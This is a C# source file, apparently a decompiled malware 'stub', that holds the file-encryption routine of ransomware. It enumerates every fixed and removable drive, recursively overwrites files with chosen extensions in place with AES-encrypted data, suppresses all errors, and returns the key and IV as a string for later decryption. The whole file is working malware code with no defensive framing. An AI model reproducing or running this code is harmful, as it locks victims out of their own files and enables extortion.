using System;
using System.IO;
using System.Security.Cryptography;
using System.Web;
using Microsoft.VisualBasic.CompilerServices;

namespace stub.FileEncrypter;

internal class FileEncrypter
{
	public static string EncryptFiles(params string[] extensions)
	{
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.GenerateKey();
		aesCryptoServiceProvider.GenerateIV();
		ICryptoTransform aes = aesCryptoServiceProvider.CreateEncryptor();
		StartEnumeration(aes, extensions);
		return HttpServerUtility.UrlTokenEncode(aesCryptoServiceProvider.Key) + "|" + HttpServerUtility.UrlTokenEncode(aesCryptoServiceProvider.IV);
	}

	public static void DecryptFiles(byte[] key, byte[] iv, params string[] extension)
	{
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.Key = key;
		aesCryptoServiceProvider.IV = iv;
		ICryptoTransform aes = aesCryptoServiceProvider.CreateDecryptor();
		StartEnumeration(aes, extension);
	}

	private static void StartEnumeration(ICryptoTransform aes, string[] extension)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Removable)
			{
				EnumerateFiles(aes, driveInfo.RootDirectory, extension);
			}
		}
	}

	private static void ProcessFile(ICryptoTransform aes, string path)
	{
		try
		{
			byte[] array = File.ReadAllBytes(path);
			array = aes.TransformFinalBlock(array, 0, array.Length);
			File.WriteAllBytes(path, array);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void EnumerateFiles(ICryptoTransform aes, DirectoryInfo d, string[] ext)
	{
		try
		{
			FileInfo[] files = d.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					if (HasExtension(fileInfo.FullName, ext))
					{
						ProcessFile(aes, fileInfo.FullName);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			DirectoryInfo[] directories = d.GetDirectories();
			foreach (DirectoryInfo d2 in directories)
			{
				try
				{
					EnumerateFiles(aes, d2, ext);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private static bool HasExtension(string name, string[] ext)
	{
		bool result = false;
		foreach (string value in ext)
		{
			if (name.EndsWith(value))
			{
				result = true;
				break;
			}
		}
		return result;
	}
}
